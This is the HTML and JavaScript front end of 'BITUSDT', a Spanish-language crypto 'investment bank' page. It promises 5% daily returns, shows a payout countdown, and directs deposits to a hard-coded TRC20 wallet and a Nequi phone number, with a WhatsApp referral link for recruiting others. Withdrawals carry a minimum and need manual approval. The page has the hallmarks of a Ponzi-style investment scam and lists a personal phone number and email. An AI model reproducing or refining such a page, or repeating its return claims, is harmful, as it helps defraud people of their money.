<!DOCTYPE html>
<html lang="es">
<head>

<meta charset="UTF-8">

<style>

body{
margin:0;
font-family:Arial;
background:#0f172a;
color:white;
}

.container{
max-width:500px;
margin:auto;
padding:20px;
padding-bottom:90px;
}

/* HEADER */

.header{
text-align:center;
margin-bottom:20px;
}

.header h1{

color:#00ffcc;
}

.subtitulo{
font-size:14px;
opacity:.8;
}

/* TARJETA SALDO */

.saldo-card{
background:linear-gradient(135deg,#2563eb,#1e40af);
padding:25px;
border-radius:15px;

}

.saldo{
font-size:32px;
font-weight:bold;
margin-top:10px;
}

/* BOTONES PRINCIPALES */

.botones{
display:grid;
grid-template-columns:1fr 1fr;
gap:10px;
margin-top:20px;
}

button{
padding:14px;
border:none;
border-radius:10px;
font-weight:bold;
cursor:pointer;
color:white;
font-size:15px;
}

.btn-green{ background:#22c55e; }
.btn-orange{ background:#f97316; }
.btn-blue{ background:#3b82f6; }
.btn-purple{ background:#9333ea; }

/* TARJETAS */

.card{
background:#1e293b;
padding:15px;
border-radius:12px;
margin-top:20px;
}

input{
width:100%;
padding:12px;
border-radius:8px;
border:none;
margin-top:10px;
}

/* HISTORIAL */

.historial-item{
margin:5px 0;
}

/* MENU INFERIOR */

.menu{
position:fixed;
bottom:0;
left:0;
right:0;
background:#111827;
display:flex;
justify-content:space-around;
padding:12px 0;
box-shadow:0 -5px 20px rgba(0,0,0,.5);
}

.menu button{
background:none;
border:none;
color:white;
font-size:13px;
}

</style>

</head>

<body>

<div class="container">

<div class="header">
<h1>BITUSDT</h1>
<div class="subtitulo">Banco de inversiones tipo CDT</div>
</div>

<!-- SALDO -->

<div class="saldo-card">

<p>Saldo disponible</p>

<div class="saldo">
<span id="saldo">0</span> USDT
</div>

<p style="margin-top:10px">
Ganancia diaria 5%
</p>
<p style="font-size:13px;margin-top:6px;">
⏳ Próxima ganancia en:
<span id="contador">calculando...</span>
</p>
<p style="font-size:13px;margin-top:6px;">
ID usuario: <span id="userid"></span>
</p>

<p style="font-size:13px">
Al retirar recibes inversión + ganancias
</p>
<p style="font-size:12px;color:#fbbf24">
Retiro mínimo: 20 USDT
</p>
</div>

<!-- MONTO -->

<div class="card">
<input type="number" id="monto" placeholder="Monto en USDT">
</div>

<!-- BOTONES -->

<div class="botones">

<button class="btn-green" onclick="invertir()">
Invertir
</button>

<button class="btn-orange" onclick="retirar()">
Retirar
</button>

<button class="btn-blue" onclick="mostrarDeposito()">
Depositar
</button>

<button class="btn-purple" onclick="compartirWhatsApp()">
Invitar
</button>
<button class="btn-green" onclick="pagarNequi()">
Recargar cuenta
</button>
</div>

<!-- BILLETERA -->

<div class="card">

<p><b>Billetera registrada</b></p>

<p id="walletDeposito">No registrada</p>

<button class="btn-blue" onclick="copiar()">
Copiar billetera
</button>

</div>

<!-- HISTORIAL -->

<div class="card">

<h3>📜 Historial</h3>

<div id="historial">Sin movimientos</div>

</div>

<!-- SOPORTE -->

<div class="card">

<h3>📞 Soporte</h3>

<a href="https://wa.me/573226314209" target="_blank">
<button class="btn-green">
Contactar por WhatsApp
</button>
</a>

<a href="mailto:enriquevega201618@gmail.com">
<button class="btn-blue" style="margin-top:10px">
Enviar correo
</button>
</a>

</div>

</div>

<!-- MENU -->

<div class="menu">

<button onclick="window.scrollTo(0,0)">
🏠 Inicio
</button>

<button onclick="mostrarDeposito()">
💰 Depositar
</button>

<button onclick="compartirWhatsApp()">
👥 Invitar
</button>

<button onclick="salir()">
🚪 Salir
</button>

</div>

<script>

const usuario = JSON.parse(localStorage.getItem("usuario"));
const ultima = new Date(usuario.ultimaActualizacion);
const proxima = new Date(ultima.getTime() + (24*60*60*1000));

function actualizarContador(){

const ahora = new Date();

let diferencia = proxima - ahora;

if(diferencia <= 0){
document.getElementById("contador").innerText = "Actualizando...";
return;
}

let horas = Math.floor(diferencia / (1000*60*60));
let minutos = Math.floor((diferencia % (1000*60*60)) / (1000*60));
let segundos = Math.floor((diferencia % (1000*60)) / 1000);

document.getElementById("contador").innerText =
horas+"h "+minutos+"m "+segundos+"s";

}

setInterval(actualizarContador,1000);
actualizarContador();
if(!usuario || !usuario.email){
alert("Sesión inválida");
localStorage.clear();
window.location.href="/login.html";
}

document.getElementById("saldo").innerText = usuario.saldo || 0;

document.getElementById("userid").innerText =
usuario.userId || "Sin ID";

document.getElementById("walletDeposito").innerText =
usuario.wallet && usuario.wallet !== "" ? usuario.wallet : "No registrada";


function copiar(){

if(!usuario.wallet){
alert("No tienes billetera registrada");
return;
}

navigator.clipboard.writeText(usuario.wallet);

alert("Billetera copiada");

}


function salir(){
localStorage.clear();
window.location.href="/";
}


function compartirWhatsApp(){

const link = window.location.origin + "/register.html?ref=" + usuario.email;

const mensaje =
"🔥 Gana dinero invirtiendo desde casa.\n\nRegístrate aquí 👇\n" + link;

const url = "https://api.whatsapp.com/send?text=" + encodeURIComponent(mensaje);

window.open(url,"_blank");

}


function mostrarDeposito(){

const billeteraEmpresa = "TXDiTXnPUV3th3rHtZaX4XqzdJeVLbJeVo";

navigator.clipboard.writeText(billeteraEmpresa);

alert(
"💰 DEPÓSITO BITUSDT\n\n" +
"Billetera copiada:\n\n" +
billeteraEmpresa +
"\n\nRed recomendada TRC20"
);

}


async function invertir(){

const monto = document.getElementById("monto").value;

if(!monto || monto <= 0){
alert("Ingresa un monto válido");
return;
}

const res = await fetch("/api/invertir",{
method:"POST",
headers:{ "Content-Type":"application/json" },
body:JSON.stringify({
email: usuario.email,
monto: monto
})
});

const data = await res.json();

alert(data.msg || "Solicitud enviada");

location.reload();

}

  async function retirar(){

const monto = Number(document.getElementById("monto").value);

if(!monto || monto <= 0){
alert("Ingresa un monto válido");
return;
}

if(monto < 20){
alert("⚠️ El retiro mínimo es de 20 USDT");
return;
}

if(monto > usuario.saldo){
alert("Saldo insuficiente");
return;
}

const res = await fetch("/api/retirar",{
method:"POST",
headers:{ "Content-Type":"application/json" },
body:JSON.stringify({
email: usuario.email,
monto: monto
})
});

const data = await res.json();

alert(data.msg || "Solicitud enviada");

location.reload();

  }


function pagarNequi(){

const numero = "3226314209";

navigator.clipboard.writeText(numero);

alert(
"💰 Recargar cuenta\n\n" +
"Puedes recargar tu saldo enviando el dinero al Nequi:\n\n" +
numero +
"\n\nEl número fue copiado automáticamente.\n\n" +
"Después de realizar la transferencia envía el comprobante al soporte para aprobar tu recarga."
);

}


</script>

</body>
</html>
